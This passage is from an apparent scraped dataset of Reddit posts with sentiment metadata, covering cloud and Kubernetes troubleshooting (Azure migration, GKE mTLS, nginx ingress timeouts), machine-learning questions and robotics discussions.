"vader_neutral": 0.874, "vader_negative": 0.043, "textblob_polarity": 0.10356893106893107, "textblob_subjectivity": 0.4776015651015651, "overall_sentiment": "positive"}},

This acquisition required us to onboard their employees and migrate their domain, which we planned to rebrand under our own domain (**MyPlace.com**). The timeline for this was extremely tight and ambitious, but we did our best to make it work.\n\n**Current State of** [**MyPlace.com**](http://MyPlace.com) **Infrastructure:**\n\n* Hybrid setup with limited on-prem data.\n* On-prem servers mainly used for:\n   * Active Directory (AD) user management.\n   * A few Group Policies (GPOs).\n* Users are synced to Entra ID via AADConnect.\n* Most users rely on Microsoft 365 tools: Outlook, OneDrive, SharePoint, Teams.\n\n[**Contoso.com**](http://Contoso.com) **Migration Challenges:**\n\n* Contoso is already cloud-based.\n* We were not allowed to perform any pre-migration work or contact their employees until the acquisition was finalized.\n* Once the sale closed, I onboarded Contoso users into our hybrid environment as cloud-based users.\n* Used **BitTitan** to migrate their data to MyPlace.com.\n* This allowed Contoso employees to begin working within our infrastructure.\n\n**Next Steps:**\n\n* Finalize the domain transfer from Contoso to MyPlace (planned for this week).\n* After stabilizing the Contoso migration, begin transitioning MyPlace’s infrastructure to a fully cloud-based model.\n* Move remaining on-prem data to SharePoint.\n* Decommission on-prem AD and GPOs where feasible.\n\n**Request for Guidance:**\n\nGiven this complex and fast-moving project, I’m looking for **planning and migration tips** from others who’ve handled similar transitions. Specifically:\n\n* What are some **common “gotchas”** to watch out for during domain transfers and cloud migrations?\n* Any **best practices** for decommissioning on-prem AD and moving fully to Entra ID?\n* Suggestions for **user communication and change management** during these transitions?\n* Recommendations for **security and compliance checks** when moving to cloud-only?", "author": "Patient-Screen-6379", "subreddit": "azure", "score": 5, "upvote_ratio": 0.86, "num_comments": 8, "created_utc": "2025-10-01T06:17:30", "url": "https://www.reddit.com/r/AZURE/comments/1nupjqq/onprem_hybrid_to_cloud_infrastructure_project/", "permalink": "https://reddit.com/r/AZURE/comments/1nupjqq/onprem_hybrid_to_cloud_infrastructure_project/", "is_self": true, "domain": "self.AZURE", "tech_keywords": ["AI", "AR", "share", "acquisition"], "crawled_at": "2025-10-03T13:57:11.216677", "sentiment_score": {"vader_compound": 0.9701, "vader_positive": 0.066, "vader_neutral": 0.928, "vader_negative": 0.007, "textblob_polarity": 0.12916666666666665, "textblob_subjectivity": 0.38559523809523805, "overall_sentiment": "positive"}},

Map renders, icons render. We can zoom in and out and both the map and the icons adjust together. \n\nThe issue is when I want to navigate between the icons via the keyboard, which applies focus to each one by one. \n\nIf I have the map zoomed out so all of the icons are visible, this works fine. \n\nHOWEVER, if I'm zoomed in to see just a subset of the icons, and my focus goes to an element outside of the viewport, all of the icons shift so that the icon I just focused on is now in the viewport. BUT, the map does not shift. \n\nThis does make some sense...at least from a general browser POV. If I tab to an element I can't see, it should move it into the viewport. \n\nBut I'm stumped as to how to fix this.

I'm about to :).\n\nMy understanding based on my experience has been:\n\nSeparate subscriptions based on resource usage (ie, Identity for DC's, Connectivity for Hub &amp; FW &amp; VPN), Prod for production servers and so on.\n\nResource groups would be used hold a group of resources, I.e. you could put all the VMs for a subscription in one if you wanted to inc attached resources, or you can split them out by Resource type (VM, NIC, Storage, etc).\n\nThe Cisco Meraki vMX-L is generally used as a VPN concentrator rather than a Firewall, so you'd usually have a Firewall sat in front of it. \n\nYou cannot use Hub &amp; Spoke without separate subscriptions.  It just doesn't work properly and subscriptions are a good way to split out workloads.\n\nAre my experience based assumptions correct?  \n\nThanks.", "author": "angriusdogius", "subreddit": "azure", "score": 8, "upvote_ratio": 1.0, "num_comments": 8, "created_utc": "2025-09-30T01:15:29", "url": "https://www.reddit.com/r/AZURE/comments/1ntmbuy/hub_spokes_vmx_and_azure_fw/", "permalink": "https://reddit.com/r/AZURE/comments/1ntmbuy/hub_spokes_vmx_and_azure_fw/", "is_self": true, "domain": "self.AZURE", "tech_keywords": ["AR"], "crawled_at": "2025-10-03T13:57:11.248829", "sentiment_score": {"vader_compound": 0.8025, "vader_positive": 0.037, "vader_neutral": 0.953, "vader_negative": 0.01, "textblob_polarity": 0.1530952380952381, "textblob_subjectivity": 0.46529761904761907, "overall_sentiment": "positive"}},

My requirements are:\n\n* Backup every 12 hours, pushing full backups to cloud storage\n* Enable versioning so I keep multiple backup points\n* Automatically delete old versions after **5 days** (after about 10 backups) to limit storage bloat\n* **If a backup push results in empty data, I want to receive an alert (e.g., email) warning me** — so I can investigate before old versions get deleted (even maybe have a rule that old data doesn't get deleted if an empty push)\n* Minimize cost as much as possible (storage + retrieval + deletion fees)\n\nI’ve looked into **Cloudflare R2** because it offers S3-compatible storage with no egress fees and decent pricing, but it doesn’t support built-in lifecycle/versioning rules or alerting for empty uploads.\n\nOn the other hand, **AWS S3 with Glacier Deep Archive** supports versioning and lifecycle policies that could automate old version deletion, but Glacier Deep Archive enforces a minimum 180-day storage period.

I created `Gateway` resources in order to create an Application Load Balancer in GCP in order to get my applications (which are in an Istio mesh) exposed to the world.\n\nSome of my Application Load Balancers need to authenticate clients, and I need to use mTLS for that. It's very straightforward in GCP to create a Client Authentication resource (aka `serverTlsPolicy`), I just followed these steps: [https://cloud.google.com/load-balancing/docs/https/setting-up-mtls-ccm#server-tls-policy](https://cloud.google.com/load-balancing/docs/https/setting-up-mtls-ccm#server-tls-policy)\n\nIt's also very easy to attach that `serverTlsPolicy` to the Application Load Balancer, by following this: [https://cloud.google.com/load-balancing/docs/https/setting-up-mtls-ccm#attach-client-authentication](https://cloud.google.com/load-balancing/docs/https/setting-up-mtls-ccm#attach-client-authentication)\n\nProblem is, I can't do that for every single Application Load Balancer, as I expect to have hundreds, and I also intend for them to be created in a self-service manner, by our clients.\n\nI've been looking everywhere for an annotation or maybe a `tls.option` in the GatewayAPI documentation, to no avail. I also tried all of the suggestions from ChatGPT, Gemini, et. al., which are of course not documented anywhere, and of course didn't work.\n\nFor example, this is one `Gateway` resource of mine\n\n    kind: Gateway\n    apiVersion: gateway.networking.k8s.io/v1\n    metadata:\n      name: gke-gateway-mtls\n      namespace: istio-system\n    spec:\n      gatewayClassName: gke-l7-global-external-managed\n      listeners:\n      - name: https\n        protocol: HTTPS\n        port: 443\n        hostname: \"*.kakarot.jp\"\n        tls:\n          mode: Terminate\n          certificateRefs:\n          - name: kakarot-jp-wildcard-cert\n    \n\nThe GCP self-link to the Client Authentication resource is as follows:\n\n    projects/playground-kakarot-584838/locations/global/serverTlsPolicies/playground-kakarot-mtls\n    \n\nCan anyone indicate to me if this is possible via GatewayAPI, or whether or not is possible at all to modify the Application Load Balancer created in GCP as a result of this `Gateway` from inside the cluster? Maybe via another manifest, or a different CRD?\n\nI'm kind of surprised, as this is something that should be quite common. It's very common in Azure for example (even though I need to manually create the SSL Policy, but attaching it to an Ingress is just a matter of introducing an annotation).\n\nAs a clarification, configuring mTLS on Istio is not an option, as mTLS needs to be terminated at the GCP Application Load Balancer as per regulatory requirements.\n\nAs I mentioned, I tried all the suggestions from AI, to no avail. I tried annotations, and `tls.options` on the listener.\n\n      listeners:\n      - name: https\n        protocol: HTTPS\n        port: 443\n        tls:\n          mode: Terminate\n          options:\n            networksecurity.googleapis.com/ServerTlsPolicy: projects/playground-kakarot-584838/locations/global/serverTlsPolicies/playground-kakarot-mtls\n    \n\nand\n\n    apiVersion: gateway.networking.k8s.io/v1beta1\n    kind: Gateway\n    metadata:\n      name: my-gateway\n      namespace: istio-system\n      annotations:\n        networking.gke.io/server-tls-policy: projects/playground-kakarot-584838/locations/global/serverTlsPolicies/playground-kakarot-mtls\n    \n\nAlso, from these, I tried every combination of `/server-tls-policy`.

{"post_id": "1nq1ss0", "title": "How Hosted Control Plane architecture makes you save twice when hitting clusters scale", "content": "Sharing this success story about implementing Hosted Control Plane in Kubernetes: if it's the first time you hear this term, [this](https://clastix.io/post/the-raise-of-hosted-control-plane-in-kubernetes/) is a brief, comprehensive introduction.\n\nA customer of ours decided to migrate all their applications to Kubernetes, the typical cloud-native. Pilot went well, teams started being onboarded, and suddenly started asking for one or more of their own cluster for several reasons, mostly for testing or compliance stuff. The current state is that they have spun up 12 clusters in total.\n\nThat's not a huge number by itself, except for the customer's hardware capacity. Before buying more hardware to bear the increasing cluster amount, management asked to start optimising costs.\n\nKubernetes basics, since each cluster was a production-grade environment, 3 VMs are just needed to host the Control Plane. Math is even simpler: the Control Plane was hosted on 36 VMs, dedicated to *just running control planes*, as best practices.\n\nThe solution we landed on together was adopting the **Hosted Control Plane (HCP) architecture**. We created a *management cluster* that stretched across the 3 available Availability Zones, just like a traditional HA Control Plane, but instead of creating VMs, those tenant clusters were running as regular pods.\n\nThe Hosted Control Plane architecture shines especially on-prem, despite its not being limited to it, and it brings several advantages. The first one is about resource saving: there aren't 39 VMs anymore, mostly idling, just for high availability of the Control Planes, but rather Pods, which offer the trivial advantages we all know in terms of resources, allocation, resiliency, etc.\n\nThe management cluster hosting those Pods still runs across 3 AZs to ensure high availability: same HA guarantees, but with a much lower footprint. It's the same architecture used by Cloud Providers such as Rackspace, IBM, OVH, Azure, Linode/Akamai, IONOS, UpCloud, and many others.\n\nThis implementation was effortlessly accepted by management, mostly driven by the resulting cost saving: what surprised me, despite the fact that I was already advocating for the HCP architecture, was the reception from IT people, because it brought operational simplicity, which is IMHO the *real* win.\n\nThe Hosted Control Plane architecture sits on the concept of Kubernetes applications: this means the lifecycle of the Control Plane becomes way easier, you can leverage autoscaling, backup/restore with tools like Velero out of the box, visibility, and upgrades are far less painful.\n\nDespite some minor VM wrangling being required for the management cluster, when hitting \"scale\", it becomes trivial, especially if you are working with Cluster API. Without considering the stress of managing Control Planes, the heart of a Kubernetes cluster: the team is saving both hardware *and* human brain cycles, two birds with one stone.  \nLess wasted infrastructure, less manual toil: more automation, no compromise on availability.\n\n**TL;DR**: if you haven't given a try to the Hosted Control Plane architecture since it's becoming day by day more relevant.

{"post_id": "1npn3dm", "title": "Timeout when uploading big files through ingress Nginx", "content": "I'm trying to fix this issue for a few days now, and can't come to a conclusion.\n\nMy setup is as follows:\n\n* K3s\n* Kube-vip with cloud controller (3 control planes and services)\n* Ingress Nginx\n\nThe best way I found to share folders from pods was using WebDav through Rclone serve, this way I can have folders mapped on URLs and paths. This is convenient to keep every pod storage isolated (I'm using Longhorn for the distributed storage).\n\nThe weird behavior happens when I try to upload larger files through WinSCP I get the following error:\n\n    Network error: connection to \"internal.domain.com\" timed out\n    Could not read status line: connection timed out\n\nThe file is only partially uploaded, always with different sizes but roughly between 1.3 and 1.5GB. The storage is 100GB and have uploaded 30GB since the first test, so the issue shouldn't be the destination disk.\n\nThe fact that the sizes are always different makes me think it is a time constraint, however the client shows a progress for the whole file size, regardless the size itself, and shows the timeout error at the end. With exactly 4GB file it took 1m30s and copied 1.3GB, so if my random math is correct, I'd say the timeout is 30s:\n\n    4GB / 1m30s = 44.4MB/s\n    ---\n    1.3GB / 44.4MB/s = ~30s\n\nSo I tried to play with Nginx settings to increase the body size and timeouts:\n\n    nginx.ingress.kubernetes.io/proxy-body-size: \"16384m\"  \n    nginx.ingress.kubernetes.io/proxy-connect-timeout: \"1800\"  \n    nginx.ingress.kubernetes.io/proxy-read-timeout: \"1800\"  \n    nginx.ingress.kubernetes.io/proxy-send-timeout: \"1800\"  \n\nUnfortunately, this doesn't help, I get the same error.\n\nNext test was to bypass Nginx, so tried port forwarding the WebDav service and I'm able to upload even 8GB files. This should exclude Rclone/WebDav as the culprits.\n\nI then tried to find more info in the Ingress logs:\n\n    192.168.1.116 - user [24/Sep/2025:16:22:39 +0000] \"PROPFIND /data-files/test.file HTTP/1.1\" 404 9 \"-\" \"WinSCP/6.5.3 neon/0.34.2\" 381 0.006 [jellyfin-jellyfin-service-data-webdav] [] 10.42.2.157:8080 9 0.006 404 240c90c966e3e31cac6846d2c9ee3d6d\n    2025/09/24 16:22:39 [warn] 747#747: *226648 a client request body is buffered to a temporary file /tmp/nginx/client-body/0000000007, client: 192.168.1.116, server: internal.domain.com, request: \"PUT /data-files/test.file HTTP/1.1\", host: \"internal.domain.com\"\n    192.168.1.116 - user [24/Sep/2025:16:24:57 +0000] \"PUT /data-files/test.file HTTP/1.1\" 499 0 \"-\" \"WinSCP/6.5.3 neon/0.34.2\" 5549962586 138.357 [jellyfin-jellyfin-service-data-webdav] [] 10.42.2.157:8080 0 14.996 - a4e1b3805f0788587b29ed7a651ac9f8\n\nFirst thing I did was to check available space on the Nginx pod given the local buffer, there is plenty of space and can see the available change as the file is uploaded, seems ok.\n\nThen the status 499 caught my attention, what I've found on the web is that when the client gets a timeout and the server a 499, it might be because of cloud providers having timeouts on top of the ingress, however I haven't found any information on something similar for Kube-vip.\n\nHow can I further investigate the issue?

Occasionally, we do get some ML projects, but most of them are straightforward classification use cases. I'm also pursuing a bachelor's degree, which has given me exposure to all the required math for deep learning and LLMs (which I believe I'm about 80% confident in). \n\nHowever, I feel like it's not doing me much good, as I don’t get to apply any of it at work. All the effort I’ve put into understanding the math behind these concepts feels like it's going to waste.\n\n**Suggestions I’d like from the experts in this sub:**\n\n1. **How do I gain a more practical understanding of how LLMs/DL work?**  \n   Do I really need to grind the math in 2025? Is it going to remain relevant for the future?\n\n2. **I’m considering doing a Master’s in AI, but I’m still unsure whether to go down the research path.**  \n   What does it actually take to succeed in research?\n\n3. **What kind of projects should I start with, given my situation?**  \n   I'm proficient in Python, but I’ve never implemented anything using PyTorch.\n\n4. **I often hear that contributing to open source can take you far in this field,**  \n   but I have no idea where to start.

Jeremy Berman currently tops the ARC-AGI-2 leaderboard with a score of 29.4%. When Tim Scarfe interviewed him for his Machine Learning Street Talk YouTube channel, asking Berman how he thinks the catastrophic forgetting problem of continual learning can be solved, and Scarfe asked him to repeat his explanation, I thought that perhaps many other developers may be unaware of this approach. \n\nThe title of the video is \"29.4% ARC-AGI-2 (TOP SCORE!) - Jeremy Berman.\" Here's the link:\n\nhttps://youtu.be/FcnLiPyfRZM?si=FB5hm-vnrDpE5liq\n\nThe relevant discussion begins at 20:30.\n\nIt's totally worth it to listen to him explain it in the video, but here's a somewhat abbreviated verbatim passage of what he says: \n\n\"I think that I think if it is the fundamental blocker that's actually incredible because we will solve continual learning, like that's something that's physically possible. And I actually think it's not so far off...The fact that every time you fine-tune you have to have some sort of very elegant mixture of data that goes into this fine-tuning process so that there's no catastrophic forgetting is actually a fundamental problem. It's a fundamental problem that even OpenAI has not solved, right?\n\nIf you have the perfect weight for a certain problem, and then you fine-tune that model on more examples of that problem, the weights will start to drift, and you will actually drift away from the correct solution. His [Francois Chollet's] answer to that is that we can make these systems composable, right? We can freeze the correct solution, and then we can add on top of that. I think there's something to that. I think actually it's possible. Maybe we freeze layers for a bunch of reasons that isn't possible right now, but people are trying to do that.\n\nI think the next curve is figuring out how to make language models composable. We have a set of data, and then all of a sudden it keeps all of its knowledge and then also gets really good at this new thing. We are not there yet, and that to me is like a fundamental missing part of general intelligence.\"\n\n\n\n", "author": "andsi2asi", "subreddit": "deeplearning", "score": 3, "upvote_ratio": 0.71, "num_comments": 9, "created_utc": "2025-10-01T08:07:21", "url": "https://www.reddit.com/r/deeplearning/comments/1nus6ov/294_score_arcagi2_leader_jeremy_berman_describes/", "permalink": "https://reddit.com/r/deeplearning/comments/1nus6ov/294_score_arcagi2_leader_jeremy_berman_describes/", "is_self": true, "domain": "self.deeplearning", "tech_keywords": ["AI", "machine learning", "AR", "openai"], "crawled_at": "2025-10-03T13:57:11.583327", "sentiment_score": {"vader_compound": 0.9754, "vader_positive": 0.122, "vader_neutral": 0.817, "vader_negative": 0.061, "textblob_polarity": 0.21648957103502559, "textblob_subjectivity": 0.5529089597271416, "overall_sentiment": "positive"}},

So wanted to ask, see what's possible today, and see the scope.\n\nRecently it was fonts, **is it possible to automatically classify fonts** (visually pretty much), by labelling them with categories such as [these](https://docs.google.com/spreadsheets/d/1Wyx1fXx2u_gVf0Z7xV9f-g2KODP_BBfb41CG6TPlRNk/edit?usp=sharing) (curvy, geometric, tapered strokes, square dots, etc.). What would it require for an implementation, so I can figure out how to do it? And if it's still a frontier research problem, what is left to solve pretty much?\n\nFurther back, I was wondering about [how to extract ancient Egyptian hieroglyphs from poor-quality PDFs](https://softwareengineering.stackexchange.com/questions/413003/how-to-ocr-and-or-recreate-lines-of-egyptian-hieroglyphs-in-unicode-html), some OCR thing probably, but seemed overwhelmingly complex to implement anything.\n\nMost visual things that I think about, which I halfway imagine AI might be able to help with, still seem too far out of reach. Either they require a ton of training data (which would take months or years of dedicated work), or it's too subtle of a thing I'm asking for (like how a font \"feels\"), or things like that.\n\nSo for the fonts question, to narrow it down, is that possible? Seems like simple classification, but asking ChatGPT about it, says it's a cutting-edge research problem still, and says I could look at the bezier curves and stroke thickness and whatnot etc., but then I am just imagining the reality is, I will have to write tons of manual code basically implementing exactly how I want to do each feature's extraction and classification. Which defeats the purpose, each new task I have in mind would require tons custom code tailored to that specific visual classification task.\n\nSo wanted to see what you're thoughts were, and if you could orient me in the right direction, maybe layout some tips on how to accomplish this without requiring tons of coding or tons of data annotation. _Coding isn't a problem, I would just prefer to write or use some generic tool, than writing custom detailed task-specific code._", "author": "lancejpollard", "subreddit": "deeplearning", "score": 1, "upvote_ratio": 1.0, "num_comments": 4, "created_utc": "2025-09-30T11:51:57", "url": "https://www.reddit.com/r/deeplearning/comments/1nu1wy8/how_realistic_is_it_to_build_custom_visual/", "permalink": "https://reddit.com/r/deeplearning/comments/1nu1wy8/how_realistic_is_it_to_build_custom_visual/", "is_self": true, "domain": "self.deeplearning", "tech_keywords": ["AI", "AR", "chatgpt"], "crawled_at": "2025-10-03T13:57:11.599565", "sentiment_score": {"vader_compound": 0.9754, "vader_positive": 0.095, "vader_neutral": 0.863, "vader_negative": 0.042, "textblob_polarity": 0.07389971139971138, "textblob_subjectivity": 0.4595076706918812, "overall_sentiment": "positive"}},

{"post_id": "1ns17b5", "title": "Alternative to NAS: A New Approach for Finding Neural Network Architectures", "content": "Over the past two years, we have been working at One Ware on a project that provides an alternative to classical Neural Architecture Search. So far, it has shown verry good results for edge-AI image classification and object detection tasks with one or multiple images as input.\n\n**The idea:** The most important information about the needed model architecture should be predictable right at the start without the need for testing thousands of architectures. So instead of testing thousands of architectures, the existing dataset is analyzed (for example, image sizes, object types, or hardware constraints), and from this analysis, a suitable network architecture is predicted.\n\nCurrently, foundation models like YOLO or ResNet are often used and then fine-tuned with NAS. However, for many specific use cases with tailored datasets, these models are vastly oversized from an information-theoretic perspective. Unless the network is allowed to learn irrelevant information, which harms both inference efficiency and speed. Furthermore, there are architectural elements such as Siamese networks or the support for multiple sub-models that NAS typically cannot support. The more specific the task, the harder it becomes to find a suitable universal model.\n\n**How our method works**\n\nFirst, the dataset and application context are automatically analyzed. For example, the number of images, typical object sizes, or the required FPS on the target hardware.\n\nThis analysis is then linked with knowledge from existing research and already optimized neural networks. Our system for example also extracts architecture elements from proven modules (e.g., residuals or bottlenecks) and finds links when to use them instead of copying a single template like “a YOLO” or “a ResNet”. The result is then a prediction of which architectural elements make sense.\n\nExample decisions:  \n\\- large objects -&gt; stronger downsampling for larger receptive fields  \n\\- high FPS on small hardware -&gt; fewer filters and lighter blocks  \n\\- pairwise inputs -&gt; Siamese path\n\nTo make the decisions, we use a hybrid approach of multiple calculations, algorithms and small models that learn what neural architecture features work best for different applications.\n\nThe predictions are then used to generate a suitable model, tailored to all requirements. Then it can be trained, learning only the relevant structures and information. This leads to much faster and more efficient networks with less overfitting.\n\n**First results**  \nIn our first whitepaper, our neural network was able to improve accuracy for a potato chip quality control from 88% to 99.5% by reducing overfitting. At the same time, inference speed increased by several factors, making it possible to deploy the model on a small FPGA instead of requiring an NVIDIA GPU.\n\nIn a new example we also tested our approach on a PCB quality control. Here we compared multiple foundation models and a neural network that was tailored to the application by scientists. Still our model was way faster and also more accurate than any other.\n\nHuman Scientists (custom ResNet18): 98.2 F1 Score @ 62 FPS on Titan X GPU  \nUniversal AI (Faster R-CNN): 97.8 F1 Score @ 4 FPS on Titan X GPU  \nTraditional Image Processing: 89.8 F1 Score @ 78 FPS on Titan X GPU  \nONE AI (custom architecture): 98.4 F1 Score @ \\~ 465 FPS on Titan X GPU\n\nWe are also working on a detailed whitepaper on our research.

{"post_id": "1nvmkq8", "title": "Problem with understanding YOLOv8 loss function", "content": "I want to create my own YOLOv8 loss function to tailor it to my very specific usecase (for academic purposes). To do that, I need access to bounding boxes and their corresponding classes. I'm using Ultralytics implementation (https://github.com/ultralytics/ultralytics). I know the loss function is defined in ultralytics/utils/loss.py in class v8DetectionLoss. I've read the code and found two tensors: target\\_scores and target\\_bboxes. The first one is of size e.g. 12x8400x12 (I think it's batch size by number of bboxes by number of classes) and the second one of size 12x8400x4 (probably batch size by number of bboxes by number of coordinates). The numbers in target\\_scores are between 0 and 1 (so I guess it's probability) and the numbers in the second one are probably coordinates in pixels.\n\nTo be sure what they represent, I took my fine-tuned model, segmented an image and then started training the model with a debugger with only one element in the training set which is the image I segmented earlier (I put a breakpoint inside the loss function). I wanted to compare what the debugger sees during training in the first epoch with the image segmented with the same model. I took 15 elements with highest probability of belonging to some class (by searching through target\\_scores with something similar to argmax) and looked at what class they are predicted to belong to and their corresponding bboxes. I expected it to match the segmented image. The problem is that they don't match at all. The elements with the highest probabilities are of completely different classes than the elements with the highest probabilities in the segmented image. The bboxes seen through debugger don't make sense at all as well (although they seem to be bboxes because their coordinates are between 0 and 640, which is the resolution I trained the model with). I know that it's a very specific question but maybe you can see something wrong with my approach.", "author": "Astaemir", "subreddit": "computervision", "score": 1, "upvote_ratio": 0.67, "num_comments": 6, "created_utc": "2025-10-02T07:25:42", "url": "https://www.reddit.com/r/computervision/comments/1nvmkq8/problem_with_understanding_yolov8_loss_function/", "permalink": "https://reddit.com/r/computervision/comments/1nvmkq8/problem_with_understanding_yolov8_loss_function/", "is_self": true, "domain": "self.computervision", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:11.703915", "sentiment_score": {"vader_compound": -0.7876, "vader_positive": 0.031, "vader_neutral": 0.926, "vader_negative": 0.043, "textblob_polarity": 0.0625, "textblob_subjectivity": 0.4253472222222222, "overall_sentiment": "negative"}},

We appear to have created a superb archive of imagery, unwittingly, perhaps. \n\nThus we have compiled a comprehensive retail image dataset that might be useful for the community:\n\n**Our Dataset Overview:**\n\n* **Size:** 1M total images, 280K highly structured/curated by event.\n* **Coverage:** UK, US, Netherlands, Ireland retail environments. Predominantly UK.\n* **Organisation:** Categorised by year/month, retailer, season, product category (down to SKU level for organised subset of imagery).\n* **Range:** Multi year coverage including seasonal merchandising patterns (Christmas, Easter, Diwali, Valentine's Day etc, over 60 events)\n* **Use cases:** Planogram compliance, shelf monitoring, inventory management, out of stock detection, product recognition, autonomous checkout systems, signage, all images are used for our consulting work so these do not feature people and images are detailed and not simply random images in stores. \n\n**What makes this unique:**\n\n* Multi market data (different retail formats, lighting, merchandising across 4 countries and thousands of store locations and hundreds of banners)\n* Temporal dimension showing how displays evolve seasonally and generally (IE general store development) across the years and locations. \n* Professional curation (not just raw dumps) by year / month / retailer / type etc. \n* Implementation support and custom sorting is available, we can offer further support to aid model training and other elements.  \n\n**Availability:** We're making this available for commercial and research use. Academic researchers can inquire about discounted licensing, it's a brave new world for us so we are testing the water to see what interest there is, and how we may be able to market this. It's a new world entirely. We think there are use cases that we would develop (IE how has value for shoppers changed, inflation tracking, shrinkflation, best practice and showcasing what happened, when etc from a trade plan perspective).\n\nThis dataset addresses a common pain point we've observed: retail CV models struggling to see and visualise across different store environments and international markets. The temporal component is particularly valuable for understanding seasonal variations, especially as time has progressed in food retail, good / bad etc. \n\n**Interested?**\n\n* Please send me a DM for sample images, detailed specifications, and pricing, we have worked up a sample and have manifests and readme etc. \n* Looking for feedback from researchers on what additional annotations would be most valuable.\n* Open to partnerships with serious ML teams. \n\nHappy to answer questions in the comments about collection methodology, image quality, or specific use cases too.

Some of the more useful and well-known ones that have been described previously are listed below:  \n***Positive Intent*** “And his/her positive intent is. . . ?”  \n***Model of the world*** “And so the way *you* see it is. . . ?”  \n***Learning*** “And what you learned from that is. . . ?”  \n***Curiosity*** “And what was most interesting to you about that is. . . ?  \n***Hierarchy of criteria*** “And what is more important to you than that is. . . ?”  \n***Analogy/Metaphor*** “And that is like what. . . ?” (Metaphor creates a category, and often also creates a *prototype* example for the category.)\n\n**Going to a more specific category** “And that is what specific kind of. . . ?”  \n**Category to example** And an example of that is. . . ?”  \n**Counterexample** (Category to example with negation) “And a time when that wasn’t true is. . . ?”\n\n**Looping between category and example, or between category and subcategory.** These patterns are seldom applicable, but *very* useful when they are, because they are logically “airtight.” Both of these loop between logical levels; the category *includes itself* as an example.  \n***Apply to self*** (applying a category to itself.) “And is that true of what you just said. . . . ?” “You said that you hate complaining; is what you said a complaint. . . ?” (See [*Six Blind Elephants, volume 2*](http://www.realpeoplepress.com/blind-elephants-understanding-ourselves-each-other-p-57.html), chapter 5)  \n***Paradox*** (applying a category to itself with negation) “You said, ‘I won’t communicate with you,’ but what you said is also a communication. . . .” (See [*Six Blind Elephants, volume 2*](http://www.realpeoplepress.com/blind-elephants-understanding-ourselves-each-other-p-57.html), chapter 7)\n\n**Ambiguous Reframing Patterns** (in addition to ***Meta***, or ***Meta-frame***, above) Each of the categories below is an example of one of the previous categories.  \n***Outcome*** Since an outcome can be either a scope of experience (a specific new car) or a category (status), asking about an outcome could shift from one scope or category to another, or from scope to category, or vice versa (four possibilities). And the outcome of that is. . . ?  \n***Another Outcome*** Just as an outcome is ambiguous, another outcome could also yield the four possibilities listed above.  \n***Meta-outcome*** (outcome of the outcome) A meta-outcome can also be either a scope of experience or a category, so again there are four possibilities. (When the prefix “meta” is used in other ways, it is also ambiguous in regard to scope and category.)  \n***“Chunk down”*** can mean either going to a smaller scope or to a more specific category.  \n***“Chunk up”*** can mean either going to a larger scope or to a more general category.  \n***Reality Strategy*** “How do you know that. . . ?” asks for the evidence (the epistemological basis) for their experience. The responder may tell you a category (“That is one of the things my parents told me.”) or a scope of experience (“I saw it happen,” or “It’s in the Bible.”).", "author": "Proof-Patient-2093", "subreddit": "nlp", "score": 8, "upvote_ratio": 1.0, "num_comments": 1, "created_utc": "2025-07-01T09:27:22", "url": "https://www.reddit.com/r/NLP/comments/1lonwrd/new_to_nlp_what_do_you_guys_think_about_reframing/", "permalink": "https://reddit.com/r/NLP/comments/1lonwrd/new_to_nlp_what_do_you_guys_think_about_reframing/", "is_self": true, "domain": "self.NLP", "tech_keywords": ["AI", "NLP", "AR"], "crawled_at": "2025-10-03T13:57:11.828234", "sentiment_score": {"vader_compound": 0.9903, "vader_positive": 0.075, "vader_neutral": 0.901, "vader_negative": 0.024, "textblob_polarity": 0.09148471011484707, "textblob_subjectivity": 0.44535007610350075, "overall_sentiment": "positive"}},

From what I gather, there are two main challenges:\n\nEach sensor’s data packet is usually timestamped relative to its own internal MCU clock. When these packets arrive at a central processor, how are they all converted into the same time reference?\n\nOnce everything is aligned to a common reference, only then can techniques like buffering IMU data (to interpolate/extrapolate and match with incoming sensor data) be applied effectively.\n\nFor example, in my setup I have a radar and an IMU, both connected separately via USB (two different ports) to a central PC for processing. Since they don’t share a hardware clock, I’m not sure how to properly align their data streams.\n\nSo how is this typically done in practice?\nDo systems distribute a common clock to all sensors?\nOr is it usually handled by timestamp correction at the fusion stage?\n\nHow do real-world implementations (e.g., robotics, UAVs, automotive) achieve robust temporal alignment?\n\nAny explanation, references, or examples of common approaches would be really helpful.", "author": "Firm-Huckleberry5076", "subreddit": "robotics", "score": 3, "upvote_ratio": 1.0, "num_comments": 9, "created_utc": "2025-10-03T14:48:16", "url": "https://www.reddit.com/r/robotics/comments/1nwqz79/time_synchronisation_in_multiple_sensor_for/", "permalink": "https://reddit.com/r/robotics/comments/1nwqz79/time_synchronisation_in_multiple_sensor_for/", "is_self": true, "domain": "self.robotics", "tech_keywords": ["AI", "robotics", "AR", "share"], "crawled_at": "2025-10-03T13:57:11.877788", "sentiment_score": {"vader_compound": 0.908, "vader_positive": 0.073, "vader_neutral": 0.918, "vader_negative": 0.009, "textblob_polarity": -0.01136363636363636, "textblob_subjectivity": 0.3657828282828282, "overall_sentiment": "positive"}},

For this I need to design the CAD assembly of the attachment. Prior to manufacturing, we wish to simulate the functionalities with Gazebo.

I design a complete assembly of the drone with the attachment, everything in a single assembly. I can either design the complete drone myself or source a pre-existing drone CAD model from internet and build on top of it.\n2. Since our simulations are based on PX4 with Gazebo, I am thinking of modifying the pre-existing x500 model provided by PX4. In this case I would need to independently design the attachment part only, export it in suitable format and somehow link it in the x500 urdf\n\nI think the second approach would be more favorable as it would eliminate the need for setting up the drone logic itself (motors, controller etc). However I can't find suitable documentation or instructions. Some searching on this topic has left me with following questions -\n\n1. Which approach should I follow?\n2. I cannot find the physical dimensions of the x500 model. How can I design my attachments with suitable geometry and dimensions?

They control much of the actuator, sensor, and battery supply chain, they subsidize production, and companies like Unitree are already shipping humanoids like the G1 and R1 to actual buyers. Meanwhile, U.S. startups such as Figure, Agility, and Apptronik are showing impressive demos, but nothing that a regular lab, business, or hobbyist can actually buy yet.\n\nSo here’s my question to the /r/robotics crowd. If the U.S. wants to not just catch up but get ahead in humanoids, where should the focus be? Should we try to build domestic supply chains for key components? Should we double down on AI, control systems, and embodied autonomy where the U.S. might have an edge? Should there be government incentives or DARPA-style programs to push commercialization faster? Or is the smarter path to focus on narrower use cases like logistics, warehouses, and defense, which could scale sooner than a general consumer humanoid?\n\nI’d really like to hear from people working in the field, because right now it feels like China is sprinting ahead on production while the U.S. is still stuck in the demo phase.", "author": "Overall-Importance54", "subreddit": "robotics", "score": 0, "upvote_ratio": 0.25, "num_comments": 15, "created_utc": "2025-10-03T00:41:41", "url": 